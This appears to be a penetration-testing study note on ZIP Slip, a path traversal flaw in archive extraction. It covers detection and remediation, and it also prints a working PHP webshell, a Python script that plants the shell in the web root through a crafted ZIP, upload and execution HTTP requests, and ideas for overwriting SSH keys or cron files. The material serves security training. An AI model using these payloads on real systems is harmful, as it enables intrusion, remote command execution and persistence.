---
tags: [vapt, file-upload, path-traversal, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.11 ZIP Slip (malicious ZIP with path traversal)"
---

# 22.11 — ZIP Slip (Malicious ZIP with Path Traversal)

## What is it?
ZIP Slip is a directory traversal vulnerability that occurs when extracting files from a malicious archive (like a `.zip`, `.tar.gz`, or `.rar`). Normally, a ZIP file contains a list of filenames and their data. When an application extracts the archive, it trusts the filenames inside. However, the ZIP format allows filenames to contain path traversal characters (like `../`).

If an attacker creates a ZIP containing a file named `../../../../var/www/html/shell.php` and uploads it, a vulnerable application will extract that file not in the intended `uploads/` directory, but right into the web root. This allows an attacker to overwrite critical system files, upload webshells, or place configuration files anywhere the application's user has write permissions.

Think of it like accepting a delivery box where one of the items inside is labeled "Put this item in the bank vault". If you just blindly follow the label without checking if the sender is authorized, the item ends up where it shouldn't.

## ASCII Diagram
```text
NORMAL EXTRACTION:
┌───────────────────────────┐         ┌─────────────────────────┐
│       archive.zip         │         │ Server File System      │
├───────────────────────────┤         ├─────────────────────────┤
│ entry: index.html         │ ──────> │ /app/uploads/index.html │
│ entry: images/logo.png    │         │ /app/uploads/images/... │
└───────────────────────────┘         └─────────────────────────┘

MALICIOUS EXTRACTION (ZIP SLIP):
┌───────────────────────────┐         ┌─────────────────────────┐
│     malicious.zip         │         │ Server File System      │
├───────────────────────────┤         ├─────────────────────────┤
│ entry: ../../shell.php    │ ───┬──> │ /app/uploads/... (SKIP) │
│ entry: normal.txt         │    │    │                         │
└───────────────────────────┘    └──> │ /app/shell.php (DANGER) │
                                      └─────────────────────────┘
```

## How to Find It
- **Manual steps:**
  1. Identify any functionality that accepts archive files (`.zip`, `.tar`, `.tar.gz`, etc.). Common places include "Import Theme", "Bulk Image Upload", or "Restore Backup" features.
  2. Create a test archive containing a file with a traversal path, such as `../zipslip_test.txt`.
  3. Upload the archive.
  4. Attempt to access the file at the parent directory of the intended upload path (e.g., `https://target.com/zipslip_test.txt`). If the file is accessible, the application is vulnerable.

- **Tool commands with flags explained:**
  To generate a test ZIP file locally using Python:
  ```bash
  python3 -c "
  import zipfile
  with zipfile.ZipFile('test.zip', 'w') as z:
      # Write a file with a traversal path
      z.writestr('../zipslip_test.txt', 'ZIP_SLIP_VULNERABLE')
  "
  ```
  Alternatively, use the `evilarc` tool specifically designed for this:
  ```bash
  # Install evilarc
  pip install evilarc
  
  # Create a zip with shell.php packed 3 directories deep
  # -o: output file
  # -p: path to prepend
  # -d: depth (how many ../ to add)
  # --os: target OS (unix/win)
  python evilarc.py shell.php -o zipslip.zip -p ../../../ -d 3 --os unix
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Prepare your malicious payload (e.g., a PHP webshell named `shell.php`).
  2. Create the malicious ZIP using a script, placing `shell.php` at a traversal path (e.g., `../../../../var/www/html/shell.php`).
  3. Upload the ZIP file to the vulnerable endpoint.
  4. The server extracts the ZIP. Due to the path traversal characters, the file is dropped into the target directory (e.g., `/var/www/html/`).
  5. Navigate to the uploaded shell (e.g., `https://target.com/shell.php?cmd=id`) to execute arbitrary commands.

- **Actual payloads:**
  **Python script to craft targeted ZIP payload:**
  ```python
  import zipfile

  payload = '<?php system($_GET["cmd"]); ?>'
  with zipfile.ZipFile('payload.zip', 'w') as zf:
      # Add a harmless file to trick superficial checks
      zf.writestr('legitimate.txt', 'Normal file data')
      # Add the malicious file aiming for the web root
      zf.writestr('../../../../../var/www/html/shell.php', payload)
  ```

- **Real HTTP request/response examples:**
  **Upload Request:**
  ```http
  POST /api/upload-theme HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

  ------WebKitFormBoundary
  Content-Disposition: form-data; name="theme_archive"; filename="payload.zip"
  Content-Type: application/zip

  PK\x03\x04... [Binary ZIP Data containing ../../../../../var/www/html/shell.php] ...
  ------WebKitFormBoundary--
  ```
  **Execution Request:**
  ```http
  GET /shell.php?cmd=whoami HTTP/1.1
  Host: target.com

  HTTP/1.1 200 OK
  www-data
  ```

## Real-World Example
In 2018, Snyk disclosed the "ZIP Slip" vulnerability affecting thousands of projects across multiple ecosystems (Java, JavaScript, Python, Ruby). One notable affected application was HP's Device Manager. Attackers uploaded a malicious ZIP file disguised as a system update. Because the extraction routine used Java's native `java.util.zip` without validating the entry names, the attacker was able to place a malicious script directly into the application's executable directory, achieving unauthenticated Remote Code Execution (RCE).

## How to Fix It
- **Developer remediation:**
  Never trust the filenames inside an archive. Before writing the extracted file to disk, you must resolve the absolute path of the destination and verify that it falls entirely within your intended extraction directory.

- **Code snippet:**
  **Safe Extraction in Python:**
  ```python
  import zipfile
  import os

  def safe_extract(zip_file_path, extract_to_dir):
      # Get the absolute, resolved path of the target directory
      target_dir = os.path.realpath(extract_to_dir)
      
      with zipfile.ZipFile(zip_file_path) as zf:
          for entry in zf.namelist():
              # Construct the full path of the file to extract
              entry_path = os.path.realpath(os.path.join(target_dir, entry))
              
              # Ensure the resolved path strictly starts with the target directory
              if not entry_path.startswith(target_dir + os.sep):
                  raise ValueError(f"Security Alert: ZIP Slip detected for entry: {entry}")
              
              # Safe to extract
              zf.extract(entry, target_dir)
  ```

## Chaining Opportunities
- This vuln + [[Missing File Permissions / Sudo Privileges]] → If the web server runs as a privileged user (e.g., `root`), use ZIP Slip to overwrite `/root/.ssh/authorized_keys` or `/etc/cron.d/malicious_cron` to instantly gain persistence and root-level RCE.
- This vuln + [[Insecure Direct Object Reference (IDOR)]] → If upload paths are predictable but separated per user (e.g., `/uploads/user_123/`), use ZIP Slip to traverse out and overwrite another user's files (`../user_456/avatar.jpg`).

## Related Notes
- [[07 - File Upload + Path Traversal]]
- [[14 - Overwriting Existing Files]]
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
